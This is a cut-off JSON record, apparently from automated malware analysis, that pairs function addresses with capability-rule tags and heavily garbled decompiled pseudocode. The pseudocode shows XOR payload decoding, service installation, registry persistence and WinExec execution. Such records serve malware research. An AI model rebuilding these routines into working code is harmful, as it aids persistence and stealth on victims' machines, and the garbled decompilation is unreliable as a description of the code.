        "decompiled_code": "\nvoid __cdecl fcn.00401890(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            *(iVar1 + arg_10h) = arg_14h ^ *(iVar1 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00401960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004019a1) overlaps instruction at (ram,0x004019a0)\n// \n// WARNING: Removing unreachable block (ram,0x004019bc)\n// WARNING: Removing unreachable block (ram,0x004019be)\n// WARNING: Removing unreachable block (ram,0x004019a1)\n\nbool fcn.00401960(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    uint uStack8;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        if (in_OF) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(param_1, param_2, 0, 0xf003f, &uStack8);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(uStack8, param_3, 0, param_4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack8);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 333
    },
    "00401a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401a10(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401a90(&var_68h, &var_4h);\n    fcn.004043a0(&var_68h, var_4h, 0x406018, 0xa3e0);\n    *arg_8h = 0x406018;\n    *arg_ch = 0xa3e0;\n    return;\n}\n",
        "token_count": 257
    },
    "00401d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d6a) overlaps instruction at (ram,0x00401d68)\n// \n// WARNING: Removing unreachable block (ram,0x00401d5c)\n// WARNING: Removing unreachable block (ram,0x00401d63)\n\nbool __cdecl fcn.00401d30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint in_stack_00000010;\n    uint arg_10h_00;\n    uint arg_10h_01;\n    ushort uVar4;\n    uchar uVar5;\n    uchar uVar6;\n    ushort uVar7;\n    ushort uVar8;\n    uint var_314h;\n    uchar auStack532 [260];\n    uchar var_10ch;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10ch = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402df0();\n    uVar7 = 0x104;\n    uVar8 = 0;\n    uVar4 = SUB42(&var_10ch, 0);\n    uVar5 = &var_10ch >> 0x10;\n    uVar6 = &var_10ch >> 0x18;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00403a40();\n        arg_ch_01 = fcn.00403a40();\n        arg_ch_02 = fcn.00403a40();\n        arg_10h_01 = arg_10h;\n        fcn.00402960(arg_10h, arg_ch_00, CONCAT13(uVar6, CONCAT12(uVar5, uVar4)), CONCAT22(uVar8, uVar7));\n        arg_10h_00 = arg_8h;\n        fcn.00402960(arg_8h, arg_ch_01, arg_10h_01, arg_ch_00);\n        fcn.00402960(arg_ch, arg_ch_02, arg_10h_00, arg_ch_01);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x41f420, &var_10ch, arg_10h);\n        iVar2 = fcn.00403a70(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(auStack532, 0x41f42c, &var_10ch, arg_8h);\n            iVar2 = fcn.00403a70(auStack532);\n            if (iVar2 != 0) {\n                (*pcVar1)(auStack532, 0x41f42c, &var_10ch, arg_ch);\n                iVar2 = fcn.00403a70(auStack532);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00402960(in_stack_00000010, 4, CONCAT13(uVar6, CONCAT12(uVar5, uVar4)), CONCAT22(uVar8, uVar7));\n    return iVar2 != 0;\n}\n",
        "token_count": 899
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004029a2) overlaps instruction at (ram,0x0040299d)\n// \n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00402960(int32_t arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int16_t extraout_CX;\n    uint16_t extraout_CX_00;\n    int32_t in_ECX;\n    ushort in_DX;\n    int32_t unaff_EBX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar6;\n    uint32_t *puVar7;\n    bool in_ZF;\n    bool bVar8;\n    bool bVar9;\n    uint lpBuffer;\n    uchar s;\n    uint var_10fh;\n    uint uStackY57;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    if ((in_ZF) || (!in_ZF)) {\n        unaff_ESI = NULL;\n        puVar6 = arg_ch;\n    }\n    else {\n        uVar1 = in(in_DX);\n        *unaff_EDI = uVar1;\n        puVar6 = unaff_EDI + 1;\n        if (&fcn.00402960::var_8h < 1) {\n            s = in_DX;\n            puVar7 = &fcn.00402960::var_10fh;\n            var_8h = unaff_EDI;\n            var_4h = unaff_ESI;\n            for (; in_ECX != 0; in_ECX = in_ECX + -1) {\n                *puVar7 = in_EAX;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = in_EAX;\n            var_ch._3_1_ = 0;\n            *(puVar7 + 2) = in_EAX;\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            fcn.00401a10(&fcn.00402960::var_4h, &fcn.00402960::var_8h);\n            uStackY57 = 0x402a98;\n            iVar5 = fcn.004040c0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            bVar8 = false;\n            bVar9 = (extraout_CX - 1U & puVar7 + 3U | 0x61be) == 0;\n            *0x41f948 = fcn.004014a0();\n            if ((!bVar8 && !bVar9) && (bVar8 || bVar9)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            iVar5 = fcn.00402d20(&stack0xfffffeec, var_4h, var_8h);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            bVar8 = (POPCOUNT((unaff_EBX ^ extraout_CX_00) & 0xff) & 1U) == 0;\n            fcn.00401240();\n            if ((!bVar8) && (bVar8)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            iVar5 = fcn.004017b0(0x41f464);\n            if (((iVar5 != -1) || (iVar5 = fcn.004017b0(0x41f458),  iVar5 != -1)) &&\n               (iVar5 = fcn.00402c60(arg_8h),  iVar5 != 0)) {\n                fcn.004044a0();\n                fcn.00401950();\n                return 1;\n            }\n            fcn.004031f0(arg_8h, &stack0xfffffeec);\n            if (CONCAT13(var_ch._3_1_, 1) != 0) {\n                fcn.00402910(arg_8h);\n            }\n            if (CONCAT13(var_ch._3_1_, 1) == 0) {\n                fcn.00401620(arg_8h, 0);\n            }\n            if (CONCAT13(var_ch._3_1_, 1) != 0) {\n                fcn.00401950();\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)();\n            (*_sym.imp.KERNEL32.dll_WinExec)();\n            return CONCAT13(var_ch._3_1_, 1);\n        }\n    }\n    uVar3 = in_EAX ^ 0xdee0ed6d;\n    uVar3 = uVar3 & 0xffff0000 | uVar3 + (uVar3 >> 8) * -0x31;\n    *(unaff_EBX + -0x9ccf383) = *(unaff_EBX + -0x9ccf383) ^ in_ECX;\n    bVar9 = false;\n    bVar8 = puVar6 == NULL;\n    puVar2 = puVar6;\n    if (!bVar8) {\n        do {\n            if ((bVar8 || bVar9 != puVar2 < 0) || (!bVar8 && bVar9 == puVar2 < 0)) {\n                pcVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n            }\n            else {\n                arg_8h = arg_8h + 1;\n                *(uVar3 - 0xc625aa) = *(uVar3 - 0xc625aa) ^ in_ECX;\n                pcVar4 = sym.imp.MSVCRT.dll_rand + uVar3;\n            }\n            in_ECX = 0x1a;\n            uVar3 = pcVar4 / 0x1a;\n            *(unaff_ESI + arg_8h) = pcVar4 % 0x1a + 'a';\n            unaff_ESI = unaff_ESI + 1;\n            bVar9 = SBORROW4(unaff_ESI, puVar6);\n            bVar8 = unaff_ESI - puVar6 == NULL;\n            puVar2 = unaff_ESI - puVar6;\n        } while (unaff_ESI < puVar6);\n    }\n    return uVar3;\n}\n",
        "token_count": 1536
    },
    "00402c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402c71) overlaps instruction at (ram,0x00402c6f)\n// \n\nbool __cdecl fcn.00402c60(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_EDX;\n    uchar *unaff_ESI;\n    uchar *unaff_EDI;\n    bool in_SF;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(in_EAX + 0x6a084573) = *(in_EAX + 0x6a084573) + in_EDX;\n        *unaff_EDI = *unaff_ESI;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = fcn.00401620(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 210
    },
    "00402df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402df0(void)\n\n{\n    uchar uVar1;\n    \n    if (*0x41f944 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41f944 = 1;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00402f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f70) overlaps instruction at (ram,0x00402f6c)\n// \n// WARNING: Removing unreachable block (ram,0x0040309e)\n// WARNING: Removing unreachable block (ram,0x00403102)\n// WARNING: Removing unreachable block (ram,0x00403134)\n// WARNING: Removing unreachable block (ram,0x00403136)\n\nuint32_t __fastcall fcn.00402f50(uchar *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *extraout_ECX;\n    uint8_t uVar5;\n    uint32_t *extraout_EDX;\n    uint8_t *unaff_EBX;\n    uchar *unaff_EBP;\n    uchar *puVar6;\n    uint32_t unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    unkbyte10 in_ST0;\n    uchar uStack132;\n    uint uStack131;\n    uchar uStack100;\n    uint uStack99;\n    uchar uStack68;\n    uint uStack67;\n    uchar uStack36;\n    uint uStack35;\n    \n    puVar6 = &stack0xfffffffc;\n    bVar8 = &stack0xfffffffc < 0x80;\n    if ((&stack0xfffffffc < 0x80) || (SBORROW4(&stack0xfffffffc, 0x80) == &uStack132 < 0)) {\n        iVar3 = fcn.00404410();\n        if (iVar3 != 0) {\n            fcn.004042e0();\n            iVar3 = fcn.004017b0(0x41f470);\n            if (iVar3 != -1) {\n                iVar3 = fcn.004017b0(0x41f464);\n                if (iVar3 == -1) {\n                    fcn.00403100();\n                }\n                return 0;\n            }\n            fcn.00402550();\n            iVar3 = fcn.00403cc0();\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uStack36 = 0;\n            uStack132 = 0;\n            puVar7 = &uStack35;\n            for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            uStack100 = 0;\n            puVar7 = &uStack131;\n            for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            uStack68 = 0;\n            puVar7 = &uStack99;\n            for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            puVar7 = &uStack67;\n            for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            uVar4 = unaff_EDI & 0xffffff00;\n            iVar3 = fcn.00401d30(&uStack132, &uStack100, &uStack36);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            iVar3 = fcn.00403d90(uVar4 >> 8 | unaff_EBX << 0x18);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            iVar3 = fcn.004029c0(&uStack132);\n            return iVar3 != 0;\n        }\n        puVar6 = unaff_EBP;\n        in_ST0 = fcn.00403100();\n        bVar8 = false;\n        in_EAX = 0;\n        param_1 = extraout_ECX;\n        param_2 = extraout_EDX;\n    }\n    *(in_EAX + -0x7ce92414) = in_ST0;\n    uVar2 = in_EAX - 1;\n    uVar1 = 9 < (uVar2 & 0xf) | in_AF;\n    uVar2 = uVar2 + uVar1 * '\\x06';\n    uVar4 = *param_2;\n    *param_2 = *param_2 + 0x9be8df84;\n    puVar6[-0x17f28a40] =\n         puVar6[-0x17f28a40] +\n         uVar2 + (0x90 < (uVar2 & 0xf0) | bVar8 | uVar1 * (0xf9 < uVar2)) * '`' + (0x6417207b < uVar4);\n    *param_1 = *param_1;\n    uVar1 = *unaff_EBX;\n    uVar5 = param_2 >> 8;\n    *unaff_EBX = *unaff_EBX + uVar5;\n    uVar2 = *(unaff_EDI + 0x5b);\n    *(unaff_EDI + 0x5b) = CONCAT11(CARRY1(uVar1, uVar5), uVar2) >> 2 | uVar2 << 7;\n    uVar4 = in(0x5d);\n    return uVar4;\n}\n",
        "token_count": 1355
    },
    "00403100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.00403100(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00402df0();\n    puStack296 = 0x40314a;\n    fcn.00402960(&stack0xfffffeec, 5, unaff_EDI, unaff_ESI);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x403164;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x403177;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x41f924;\n    uStack312 = 0x41f764;\n    uStack316 = 0x80000000;\n    uStack320 = 0x403197;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x41f798;\n    uStack328 = 1;\n    uStack332 = 0x41f924;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x41f7e4, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x41f820, 1, 0x41f828, 0x14);\n    return;\n}\n",
        "token_count": 674
    },
    "004031f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004031f0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00402e40(arg_8h_00, arg_8h);\n    uVar1 = fcn.004011d0(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 146
    },
    "00403280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040329b) overlaps instruction at (ram,0x00403298)\n// \n// WARNING: Removing unreachable block (ram,0x004032c3)\n\nuint __fastcall fcn.00403280(uint param_1, char param_2, uint param_3, uint param_4)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uint in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *unaff_EDI;\n    bool in_OF;\n    \n    if ((in_OF) || (!in_OF)) {\n        in_EAX = param_4;\n    }\n    uVar4 = CONCAT31(in_EAX >> 8, 0x98) | 0x8b;\n    puVar1 = uVar4 - 1;\n    *puVar1 = *puVar1 | 0x5d;\n    *unaff_EDI = *unaff_EDI + 0x458b5d21;\n    pcVar2 = uVar4 + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    iVar5 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar5 != 0) {\n        iVar6 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar5, 0, 0);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetLastError;\n        if (((iVar6 == 0) && (iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar6 != 0x420)) &&\n           (iVar6 = (*pcVar3)(),  iVar6 != 0x422)) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar5);\n            return 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar5);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 461
    },
    "00403560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403560(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403320(&var_68h, &var_4h);\n    fcn.004043a0(&var_68h, var_4h, 0x41040c, 0xf000);\n    *arg_8h = 0x41040c;\n    *arg_ch = 0xf000;\n    return;\n}\n",
        "token_count": 253
    },
    "00403710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403781) overlaps instruction at (ram,0x00403780)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403710(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t *arg_14h, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t *puVar3;\n    uint8_t uVar4;\n    uint32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t unaff_EBX;\n    uint32_t uVar7;\n    uchar *puVar8;\n    uint *unaff_ESI;\n    uint *puVar9;\n    uint *unaff_EDI;\n    uint *puVar10;\n    uint *puVar11;\n    bool bVar12;\n    bool bVar13;\n    uint uStack36;\n    uint32_t *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puVar8 = &var_1h + 1;\n    puVar3 = arg_14h * 2;\n    bVar12 = false;\n    bVar13 = arg_14h == NULL;\n    if (0 < arg_14h) {\n        puVar10 = 0x1;\n        do {\n            if ((bVar12 || bVar13) || (unaff_EBX = unaff_EBX & 0xffff00ff,  !bVar12 && !bVar13)) {\n                in_EDX = *(puVar8 + 0x10);\n                arg_14h = *(puVar8 + -8);\n                puVar3 = puVar3 & 0xffffff00 | *(arg_14h + in_EDX);\n                puVar8[-1] = *(arg_14h + in_EDX);\n                uStack36 = puVar3;\n                puStack32 = arg_14h;\n            }\n            puVar11 = puVar10 + 1;\n            puVar9 = unaff_ESI + 1;\n            *puVar10 = *unaff_ESI;\n            uVar7 = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n            puVar8 = 0x8be181d0;\n            arg_14h[-1] = 0x8be181d0;\n            *(uVar7 + 0xc8af845) = *(uVar7 + 0xc8af845) + puVar3;\n            arg_14h[-2] = in_EDX;\n            while( true ) {\n                puVar10 = *0x8be181d8;\n                uVar5 = puVar11 % *0x8be181dc;\n                uVar1 = *(uVar5 + *0x8be181d8);\n                *arg_14h = uVar7;\n                arg_14h[-1] = puVar9;\n                *(arg_14h + -6) = uVar5;\n                bVar12 = (puVar9 & 0xffff0000 | puVar9 + 1) < 0x222c;\n                puVar9 = arg_14h[-1];\n                uVar7 = *arg_14h;\n                if (bVar12) break;\n                *(arg_14h + 2) = puVar11;\n                puVar11 = puVar11 & 0xffff0000 | *(arg_14h + 2);\n                if (!bVar12) break;\n                bVar12 = arg_14h + 1 < *puVar10;\n                *arg_14h = 0xb7f8c08b;\n                if (bVar12 || puVar10 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar3 = ((uVar5 >> 8 & 0xffff00) << 8 | *(arg_14h + -6)) + 0x59;\n                uVar1 = uVar1 & 0x1f;\n                uVar5 = *puVar3;\n                *puVar3 = CONCAT14(bVar12, uVar5) >> uVar1 | uVar5 << 0x21 - uVar1;\n            }\n            uVar5 = (puVar11 + -1) / *0x8be181dc;\n            uVar6 = (puVar11 + -1) % *0x8be181dc;\n            uVar2 = *0x8be181cf ^ *(uVar6 + *0x8be181d8);\n            if ((uVar2 < '\\x01') || ('\\0' < uVar2)) {\n                *arg_14h = uVar6;\n                uStack36 = uStack36 & 0xffffff00;\n            }\n            else {\n                *arg_14h = uVar7;\n            }\n            unaff_ESI = *0x8be181e8;\n            uVar4 = *0x8be181c4;\n            uVar2 = *0x8be181c4 ^ uVar2;\n            unaff_EBX = uVar7 & 0xffff0000 | uVar2;\n            *(*0x8be181e8 + -1 + puVar11) = uVar2;\n            puVar3 = *0x8be181e4;\n            if ((uVar2 != 0) && (uStack36 = (uVar5 & 0xffff00) << 8,  puStack32 = uVar5 >> 0x18,  uVar2 == 0)) {\n                unaff_ESI = unaff_EDI;\n            }\n            uVar4 = uVar4 ^ uVar1;\n            in_EDX = CONCAT13(puStack32._0_1_, uStack36._1_3_) & 0xffffff00 | uVar4;\n            *(puVar11 + unaff_ESI) = uVar4;\n            arg_14h = *0x8be181c8 + 1;\n            puVar10 = puVar11 + 2;\n            bVar12 = arg_14h < puVar3;\n            bVar13 = arg_14h == puVar3;\n            *0x8be181c8 = arg_14h;\n        } while (arg_14h < puVar3);\n    }\n    return;\n}\n",
        "token_count": 1460
    },
    "004039a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.004039a0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar1) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                pcVar4 = arg_10h + 1;\n                iVar2 = arg_14h;\n                pcVar3 = arg_8h;\n                do {\n                    pcVar3 = pcVar3 + 1;\n                    iVar2 = iVar2 + -1;\n                    if (iVar2 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar1);\n    }\n    return NULL;\n}\n",
        "token_count": 310
    },
    "00403a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403a40(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00403d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403d10(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    iVar3 = fcn.004035e0(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    *(iVar3 + 0x58) = arg_ch;\n    fcn.004035e0(uVar1, uVar2, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 152
    },
    "00403d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
